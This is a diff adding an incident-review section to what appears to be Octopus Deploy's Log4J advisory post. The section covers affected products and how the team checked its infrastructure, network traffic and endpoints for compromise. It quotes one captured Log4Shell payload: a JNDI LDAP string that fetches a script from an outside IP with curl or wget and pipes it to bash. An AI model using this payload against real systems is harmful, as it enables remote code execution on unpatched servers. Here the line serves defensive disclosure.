@@ -42,7 +42,6 @@ Follow our [security advisory](https://advisories.octopus.com/adv/2021-13---Octo
 ## Octopus Cloud, Octopus Server, and Octopus Tentacle
 
 Octopus Cloud, Octopus Server, and Octopus Tentacle are not affected by this vulnerability. They’re built with the .NET framework and don’t use any ported versions of Log4J.
-
 ## Breakdown of all products
 
 | Product | Vulnerable Log4J version used | Vulnerable product versions | Patched product versions |
@@ -56,6 +55,38 @@ Octopus Cloud, Octopus Server, and Octopus Tentacle are not affected by this vul
 | Octopus Server | No | N/A | N/A |
 | Octopus Tentacle | No | N/A | N/A |
 | TeamCity Plugin | Yes | <= 6.1.5 | 6.1.7 |
+
+## Was Octopus Deploy compromised? 
+
+From an internal infrastructure perspective we are running products that were using a vulnerable version of Log4J however, we have invested a significant amount of time since the initial announcement on Thursday the 9th of December and we believe Octopus Deploy was not compromised.
+
+While our engineering teams were working to update our products that were affected our Security Operations team focused on analyzing our systems to determine if they had been exploited. The following sections will go a little further into how we went about it.
+
+### Reviewing our internal infrastructure
+
+The vast majority of our internal infrastructure is maintained as Infrastructure as Code (IaC) this allowed us to easily identify potentially vulnerable systems and push updates to these systems with minimal intervention.
+
+In instances where we were unable to determine if a system could be vulnerable or not the Security Operations team used known proof of concepts (PoC) to test if a system was vulnerable and allow us to better mitigate the particular system.
+
+### Reviewing network traffic
+
+We maintain a significant amount of network data across our infrastructure which allows us to identify suspicious network behavior which could result in exploitation of our infrastructure. While reviewing the network data we identified the following:
+
+1. Suspicious activity - We were able to identify suspicious inbound network traffic to our systems including source IPs. However, we didn't identify any malicious outbound traffic which was reassuring.
+2. Identifying targeted systems - While analyzing the network data we were able to identify specific systems that were being aggressively targeted and put extra controls and mitigations around those systems to reduce the risk of exploitation.
+
+Here is a user agent string that was sent to one of our servers (decoded and redacted):
+
+```
+${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/(curl -s 45.155.205.233:5874/XXX.XXX.XXX.XXX:443||wget -q -O- 45.155.205.233:5874/XXX.XXX.XXX.XXX:443)|bash}
+```
+### Reviewing endpoints
+
+With the information from reviewing the network data we were able to review specific endpoints that we knew had been aggressively targetted and confirm that they had not been compromised.
+
+Secondary to this by using an EDR solution on our endpoints we are also able to closely monitor them for any signs of compromise or potential exploitation. This data (along with other data sets) feeds into our SIEM (Security Incident and Event Management) system allowing us to be alerted in near real time and respond accordingly.
+
+Using all these approaches to investigate our infrastructure we have found no evidence of a compromise.
 
 ## Conclusion
 
